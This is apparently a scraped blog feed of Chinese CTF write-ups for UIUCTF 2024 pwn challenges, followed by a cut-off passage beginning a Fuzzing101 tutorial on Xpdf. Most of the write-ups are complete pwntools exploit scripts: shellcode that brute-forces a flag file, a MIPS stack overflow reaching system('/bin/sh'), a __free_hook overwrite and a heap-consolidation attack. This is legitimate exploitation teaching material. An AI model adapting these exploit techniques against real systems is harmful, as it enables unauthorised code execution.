fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)<br><br>s    =    lambda a              :pw.send(a)<br>sl   =    lambda a              :pw.sendline(a)<br>sa   =    lambda a,b            :pw.sendafter(a,b)<br>sla  =    lambda a,b            :pw.sendlineafter(a,b)<br>r    =    lambda a=6666         :pw.recv(a)<br>rl   =    lambda                :pw.recvline()<br>ru   =    lambda a,b=True       :pw.recvuntil(a,b)<br>g64  =    lambda                :u64(pw.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>g32  =    lambda                :u32(pw.recvuntil(b&#x27;\xf7&#x27;).ljust(4,b&#x27;\x00&#x27;))<br>gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b&#x27;\x00&#x27;))<br>gc   =    lambda a              :u64(pw.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>pwpw =    lambda                :pw.interactive()<br>lss  =    lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))<br>cal  =    lambda a,b            :((a - b) + 0x10000) % 0x10000<br><br>def sb(libc_base):<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br>def orw(libc_base):<br>    return libc_base + libc.sym[&#x27;open&#x27;], libc_base + libc.sym[&#x27;read&#x27;], libc_base + libc.sym[&#x27;write&#x27;]<br><br>def search():<br>    libc = LibcSearcher(&quot;puts&quot;, puts)<br>    libc_base = puts - libc.dump(&quot;puts&quot;)<br>    system = libc.dump(&quot;system&quot;) + libc_base<br>    binsh = libc.dump(&quot;str_bin_sh&quot;) + libc_base<br>    return system,binsh<br><br>def dbg(a=&#x27;&#x27;):<br>    if a !=&#x27;&#x27;:<br>        gdb.attach(pw,a) <br>        pause()<br>    else:<br>        gdb.attach(pw)  <br>        pause()<br>  <br>context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)<br># context.arch=&#x27;i386&#x27;<br>context.terminal=[&quot;tmux&quot; ,&quot;split&quot; ,&quot;-h&quot;]<br>#context.arch = &#x27;amd64&#x27;<br>file = &#x27;./syscalls&#x27;<br>elf = ELF(file)<br>#libc = ELF(&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;)  <br># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>debug = 3<br>if debug == 0:<br>    pw = process(file)<br>if debug == 1:<br>    pw = remote(&quot;pwn-5519381bfe.challenge.xctf.org.cn&quot;, 9999, ssl=True)<br><br>#----------------------------------------------------------------------<br># dbg(&#x27;b *$rebase(0x012D6)&#x27;)<br># pw = remote(&quot;syscalls.chal.uiuc.tf&quot;, 1337, ssl=True)<br>ss = &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#125;&#123;-&quot;<br>l = [ord(x) for x in ss]<br>flag = &quot;&quot;<br><br>index = 0<br>shellcode = asm(shellcraft.openat(-100, &#x27;flag.txt&#x27;))<br>shellcode += asm(shellcraft.mmap(0,0x50,7,2,3,0))<br>cmp_ = &#x27;&#x27;&#x27;<br>    mov dl, byte ptr [rax+&#123;&#125;]<br>    mov cl, &#123;&#125;<br>    cmp cl,dl<br>    je loop<br>    mov rax,60<br>    syscall<br>    loop:<br>        jmp loop<br>&#x27;&#x27;&#x27;<br># ru(&#x27;flag.txt&#x27;)<br># ru(&#x27;can give you.\n&#x27;) <br># sl(shellcode+asm(cmp_.format(1,ord(&#x27;i&#x27;))))<br><br>flag = &quot;&quot;<br>index = 0<br>k = 0<br>print(l[0])<br>for x in range(0x50):<br>    sleep(1)<br><br>    if l[k] == 125:<br>        break<br><br>    for i in range(len(ss)): <br>        # pw = process(&#x27;./syscalls&#x27;)<br>        pw = remote(&quot;syscalls.chal.uiuc.tf&quot;, 1337, ssl=True)<br>        ru(b&#x27;you.\n&#x27;)  <br>        sl(shellcode+asm(cmp_.format(index,l[i])))<br>        try:<br>            print(&#x27;len :&#x27;,index,chr(l[i]))  <br>            pw.recv(timeout=2)<br>            flag += chr(l[i])<br>            print(&#x27;yes :&#x27;,l[i])<br>            index += 1<br>            k = i<br>            pw.close()<br>        except:<br>            print(&#x27;no&#x27;)<br>            pw.close()<br><br>print(flag)<br><br><br># sleep(0.2)<br># sl(b&#x27;a&#x27;*10)<br><br>pwpw()<br><br><br>#uiuctf&#123;a53HaIf9aald1fa5906de364a1162e0833cS7a0246ax9ffc&#125;<br></code></pre></td></tr></table></figure><h2 id="Backup-Power"><a href="#Backup-Power" class="headerlink" title="Backup Power"></a>Backup Power</h2><p>​存在栈溢出</p><img src="/2024/07/01/uiuctf/1.png" class=""><p>​溢出时发现，strcpy函数时通过一个地址的偏移来给的</p><img src="/2024/07/01/uiuctf/2.png" class=""><p>​system距离strcpy的距离是0x8，这里的gp也是可控的，之间就劫持为system了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs undefined">from pwn import *<br>from struct import *<br>from ctypes import *<br>from LibcSearcher import *<br>from functools import reduce<br>from z3 import *<br>import gmpy2<br>#import ctf_pb2<br><br>c = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br># srop :    frame = SigreturnFrame()<br># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)<br><br>s    =    lambda a              :pw.send(a)<br>sl   =    lambda a              :pw.sendline(a)<br>sa   =    lambda a,b            :pw.sendafter(a,b)<br>sla  =    lambda a,b            :pw.sendlineafter(a,b)<br>r    =    lambda a=6666         :pw.recv(a)<br>rl   =    lambda                :pw.recvline()<br>ru   =    lambda a,b=True       :pw.recvuntil(a,b)<br>g64  =    lambda                :u64(pw.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>g32  =    lambda                :u32(pw.recvuntil(b&#x27;\xf7&#x27;).ljust(4,b&#x27;\x00&#x27;))<br>gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b&#x27;\x00&#x27;))<br>gc   =    lambda a              :u64(pw.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>pwpw =    lambda                :pw.interactive()<br>lss  =    lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))<br>cal  =    lambda a,b            :((a - b) + 0x10000) % 0x10000<br><br>def sb(libc_base):<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br>def orw(libc_base):<br>    return libc_base + libc.sym[&#x27;open&#x27;], libc_base + libc.sym[&#x27;read&#x27;], libc_base + libc.sym[&#x27;write&#x27;]<br><br>def search():<br>    libc = LibcSearcher(&quot;puts&quot;, puts)<br>    libc_base = puts - libc.dump(&quot;puts&quot;)<br>    system = libc.dump(&quot;system&quot;) + libc_base<br>    binsh = libc.dump(&quot;str_bin_sh&quot;) + libc_base<br>    return system,binsh<br><br>def dbg(a=&#x27;&#x27;):<br>    if a !=&#x27;&#x27;:<br>        gdb.attach(pw,a) <br>        pause()<br>    else:<br>        gdb.attach(pw)  <br>        pause()<br>  <br># context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)<br># context.arch=&#x27;i386&#x27;<br>context.terminal=[&quot;tmux&quot; ,&quot;split&quot; ,&quot;-h&quot;]<br>context.arch = &#x27;mips&#x27;  <br><br>pwn_arch =&#x27;mips&#x27; #riscv riscv32 <br>link_dir = &quot;/usr/mipsel-linux-gnu&quot;<br>pwnfile = &#x27;./backup-power&#x27;<br>port= &quot;8888&quot; <br>context.binary = pwnfile<br>debug = 1<br>if debug == 1 :<br>    pw = process([&quot;qemu-&quot; + pwn_arch , &quot;-g&quot;,port, pwnfile])<br>elif debug == 0:<br>    pw = process([&quot;qemu-&quot; + pwn_arch , pwnfile])<br>elif debug == 2: <br>    pw = remote(&#x27;backup-power.chal.uiuc.tf&#x27;,1337,ssl=True)<br>else:<br>    exit(0)<br><br>if debug == 1:<br>    attach_payload =&quot;&quot;&quot;<br>        gdb-multiarch  \<br>        -ex &quot;file &#123;0&#125;&quot; \<br>        -ex &quot;target remote :&#123;1&#125;&quot; \<br>        -ex &quot;set  architecture &#123;2&#125;&quot; \<br>        &quot;&quot;&quot;.format(pwnfile , port , pwn_arch)  <br>    pwnlib.util.misc.run_in_new_terminal(attach_payload)<br><br>#----------------------------------------------------------------------<br># dbg(&#x27;b *0x400a50 x&#x27;)<br>sl(b&#x27;devolper&#x27;)<br><br>sl(b&#x27;a&#x27;*44 + p32(0x400b0c) + b&#x27;a&#x27; * 24 + p32(0x4aa330+8) + b&#x27;a&#x27;*220 + b&#x27;/bin/sh\x00&#x27; + cyclic(248) + p32(0x746f646f))<br># 0x4aa330<br># sl(b&#x27;a&#x27;*0x10)<br><br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="Rusty-Pointers"><a href="#Rusty-Pointers" class="headerlink" title="Rusty Pointers"></a>Rusty Pointers</h2><p>rust看不懂，盲打的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs undefined">from pwn import *<br>from struct import *<br>from ctypes import *<br>from LibcSearcher import *<br>from functools import reduce<br>from z3 import *<br>import gmpy2<br>#import ctf_pb2<br><br>c = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br># srop :    frame = SigreturnFrame()<br># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)<br><br>s    =    lambda a              :pw.send(a)<br>sl   =    lambda a              :pw.sendline(a)<br>sa   =    lambda a,b            :pw.sendafter(a,b)<br>sla  =    lambda a,b            :pw.sendlineafter(a,b)<br>r    =    lambda a=6666         :pw.recv(a)<br>rl   =    lambda                :pw.recvline()<br>ru   =    lambda a,b=True       :pw.recvuntil(a,b)<br>g64  =    lambda                :u64(pw.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>g32  =    lambda                :u32(pw.recvuntil(b&#x27;\xf7&#x27;).ljust(4,b&#x27;\x00&#x27;))<br>gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b&#x27;\x00&#x27;))<br>gc   =    lambda a              :u64(pw.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>pwpw =    lambda                :pw.interactive()<br>lss  =    lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))<br>cal  =    lambda a,b            :((a - b) + 0x10000) % 0x10000<br><br>def sb(libc_base):<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br>def orw(libc_base):<br>    return libc_base + libc.sym[&#x27;open&#x27;], libc_base + libc.sym[&#x27;read&#x27;], libc_base + libc.sym[&#x27;write&#x27;]<br><br>def search():<br>    libc = LibcSearcher(&quot;puts&quot;, puts)<br>    libc_base = puts - libc.dump(&quot;puts&quot;)<br>    system = libc.dump(&quot;system&quot;) + libc_base<br>    binsh = libc.dump(&quot;str_bin_sh&quot;) + libc_base<br>    return system,binsh<br><br>def dbg(a=&#x27;&#x27;):<br>    if a !=&#x27;&#x27;:<br>        gdb.attach(pw,a) <br>        pause()<br>    else:<br>        gdb.attach(pw)  <br>        pause()<br>  <br># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)<br># context.arch=&#x27;i386&#x27;<br>context.terminal=[&quot;tmux&quot; ,&quot;split&quot; ,&quot;-h&quot;]<br>context.arch = &#x27;amd64&#x27;<br>file = &#x27;./rusty_ptrs&#x27;<br>elf = ELF(file)<br>libc = ELF(&#x27;/home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so&#x27;)  <br># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>debug = 2<br>if debug == 0:<br>    pw = process(file)<br>if debug == 1:<br>    pw = remote(&quot;pwn-5519381bfe.challenge.xctf.org.cn&quot;, 9999, ssl=True)<br>if debug == 2:<br>    gdbscript = &#x27;&#x27;&#x27;<br>        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/<br>        continue<br>    &#x27;&#x27;&#x27;<br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br>#----------------------------------------------------------------------<br>def add(a):<br>    sla(b&#x27;&gt;&#x27;,str(1))<br>    sla(b&#x27;&gt;&#x27;,str(a))<br>def free(a,idx):<br>    sla(b&#x27;&gt;&#x27;,str(2))<br>    sla(b&#x27;&gt;&#x27;,str(a))<br>    sla(b&#x27;&gt;&#x27;,str(idx))<br>def show(a,idx):<br>    sla(b&#x27;&gt;&#x27;,str(3))<br>    sla(b&#x27;&gt;&#x27;,str(a))<br>    sla(b&#x27;&gt;&#x27;,str(idx))<br>def edit(a,idx,text):<br>    sla(b&#x27;&gt;&#x27;,str(4))<br>    sla(b&#x27;&gt;&#x27;,str(a))<br>    sla(b&#x27;&gt;&#x27;,str(idx))<br>    sla(b&#x27;&gt;&#x27;,text)<br>def magic():<br>    sla(b&#x27;&gt;&#x27;,str(5))<br><br>magic()<br>pw.recv(1)<br>libc_base = int(pw.recv(14),16) - 0x1ecbe0<br>lss(&#x27;libc_base&#x27;)<br><br>add(2)<br>add(2)<br>add(2)<br>add(2)<br><br>free(2,0)<br>free(2,1)<br>add(1)<br>edit(1,0,p64(libc_base+libc.sym[&#x27;__free_hook&#x27;]))<br><br>add(2)<br>add(2)<br>edit(2,2,b&#x27;/bin/sh\x00&#x27;)<br>edit(2,3,p64(libc_base+libc.sym[&#x27;system&#x27;]))<br><br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="pwnymalloc"><a href="#pwnymalloc" class="headerlink" title="pwnymalloc"></a>pwnymalloc</h2><img src="/2024/07/01/uiuctf/3.png" class=""><img src="/2024/07/01/uiuctf/4.png" class=""><p>​有个类似unlink堆块合并的操作，前提是能进入if内，也就是保证pre_size的堆块有size，以及size的最后半个字节是1，可以通过写入堆块的操作覆盖pre_size，然后伪造一下合并的区域就可以申请到前面堆块了，往堆块写入1，就可以get_flag了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs undefined">from pwn import *<br>from struct import *<br>from ctypes import *<br>from LibcSearcher import *<br>from functools import reduce<br>from z3 import *<br>import gmpy2<br>#import ctf_pb2<br><br>c = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br># srop :    frame = SigreturnFrame()<br># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)<br><br>s    =    lambda a              :pw.send(a)<br>sl   =    lambda a              :pw.sendline(a)<br>sa   =    lambda a,b            :pw.sendafter(a,b)<br>sla  =    lambda a,b            :pw.sendlineafter(a,b)<br>r    =    lambda a=6666         :pw.recv(a)<br>rl   =    lambda                :pw.recvline()<br>ru   =    lambda a,b=True       :pw.recvuntil(a,b)<br>g64  =    lambda                :u64(pw.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>g32  =    lambda                :u32(pw.recvuntil(b&#x27;\xf7&#x27;).ljust(4,b&#x27;\x00&#x27;))<br>gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b&#x27;\x00&#x27;))<br>gc   =    lambda a              :u64(pw.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>pwpw =    lambda                :pw.interactive()<br>lss  =    lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))<br>cal  =    lambda a,b            :((a - b) + 0x10000) % 0x10000<br><br>def sb(libc_base):<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br>def orw(libc_base):<br>    return libc_base + libc.sym[&#x27;open&#x27;], libc_base + libc.sym[&#x27;read&#x27;], libc_base + libc.sym[&#x27;write&#x27;]<br><br>def search():<br>    libc = LibcSearcher(&quot;puts&quot;, puts)<br>    libc_base = puts - libc.dump(&quot;puts&quot;)<br>    system = libc.dump(&quot;system&quot;) + libc_base<br>    binsh = libc.dump(&quot;str_bin_sh&quot;) + libc_base<br>    return system,binsh<br><br>def dbg(a=&#x27;&#x27;):<br>    if a !=&#x27;&#x27;:<br>        gdb.attach(pw,a) <br>        pause()<br>    else:<br>        gdb.attach(pw)  <br>        pause()<br>  <br># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)<br># context.arch=&#x27;i386&#x27;<br>context.terminal=[&quot;tmux&quot; ,&quot;split&quot; ,&quot;-h&quot;]<br>context.arch = &#x27;amd64&#x27;<br>file = &#x27;./chal&#x27;<br>elf = ELF(file)<br>#libc = ELF(&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;)  <br># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) x<br>debug = 0<br>if debug == 0:<br>    pw = process(file)<br>if debug == 1:<br>    pw = remote(&quot;pwn-5519381bfe.challenge.xctf.org.cn&quot;, 9999, ssl=True)<br>if debug == 2:<br>    gdbscript = &#x27;&#x27;&#x27;<br>        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/<br>        continue<br>    &#x27;&#x27;&#x27;<br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br>#----------------------------------------------------------------------<br>def re(data,text):<br>    sla(b&#x27;&gt; &#x27;,str(3))<br>    sla(&#x27;refunded:\n&#x27;,str(data))<br>    sa(b&#x27;request:\n&#x27;,text)<br><br>def su(a):<br>    sla(b&#x27;&gt;&#x27;,str(1))<br>    sla(b&#x27;:\n&#x27;,a)<br><br><br>def getflag(idx):<br>    ru(&#x27;&gt; &#x27;)<br>    sl(&#x27;4&#x27;)<br>    ru(&#x27;:\n&#x27;)<br>    sl(str(idx))<br><br><br>pay = fit(&#123;<br>    0x60: 0x40,<br>    0x78: 0,<br>    &#125;,filler=b&#x27;\x00&#x27;)[:-1]<br><br>re(&#x27;8&#x27;,pay)<br><br><br>pay = fit(&#123;<br>    0x78: 0xb0,<br>    &#125;,filler=b&#x27;\x00&#x27;)[:-1]<br><br>re(&#x27;-1&#x27;,pay)<br><br>su(&#x27;1&#x27;)<br>pay = p64(1) * 6 + b&#x27;\n&#x27;<br>re(&#x27;1&#x27;,pay)<br><br><br>getflag(1)<br># dbg()<br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="Syscalls2"><a href="#Syscalls2" class="headerlink" title="Syscalls2"></a>Syscalls2</h2><p>?你还真以为我会内核哇，必不可能会的，兄弟</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fuzzing101-01</title>
    <link href="/2024/07/01/fuzzing101-01/"/>
    <url>/2024/07/01/fuzzing101-01/</url>
    
    <content type="html"><![CDATA[<h1 id="Xpdf"><a href="#Xpdf" class="headerlink" title="Xpdf"></a><center>Xpdf</h1><p>CVE-2019-13288</p><h2 id="下载并构建目标"><a href="#下载并构建目标" class="headerlink" title="下载并构建目标"></a>下载并构建目标</h2><p>环境安装(如make和gcc)</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> build-essential<br></code></pre></td></tr></table></figure><p>下载Xpdf 3.02</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.xpdfreader.com/old/xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br><span class="hljs-attribute">tar</span> -xvzf xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br></code></pre></td></tr></table></figure><p>构建Xpdf</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> xpdf-3.02<br>sudo apt update &amp;&amp; sudo apt install -y build-essential gcc<br><br><span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=</span><span class="hljs-string">&quot;你需要存放的路径/install/&quot;</span><br><span class="hljs-comment">#./configure: 这是一个脚本，用于检查系统的环境并生成适当的 Makefile。</span><br><span class="hljs-comment">#--prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;: 这是一个配置选项，指定软件安装的前缀路径。所有的安装文件（例如可执行文件、库文件等）都会被安装到这个路径下。</span><br><br>make<br><span class="hljs-comment">#会读取当前目录下的Makefile文件并执行其中的指令</span><br>make install<br><span class="hljs-comment">#将编译好的程序、库文件和其他资源文件安装道系统的指定目录中</span><br></code></pre></td></tr></table></figure><p>下载pdf示例用于测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mozilla/</span>pdf.js-sample-files<span class="hljs-regexp">/raw/m</span>aster/helloworld.pdf<br><br>上一步存放的路径<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/pdfinfo -box -meta pfd示例存放的路径/</span>pdf_examples/helloworld.pdf<br></code></pre></td></tr></table></figure><p>​出现下面所示说明xpdf搭建成功</p><img src="/2024/07/01/fuzzing101-01/1.png" class=""><h2 id="AFL-编译项目开始fuzz"><a href="#AFL-编译项目开始fuzz" class="headerlink" title="AFL++编译项目开始fuzz"></a>AFL++编译项目开始fuzz</h2><p>首先将之间编译的内容删除并清空</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r 你的路径/install (就是之间指定存放install的地方)<br><span class="hljs-built_in">cd</span> 你的路径/xpdf-3.02<br>make clean<br></code></pre></td></tr></table></figure><p>用afl-clang-fast编译插桩</p><figure class="highlight 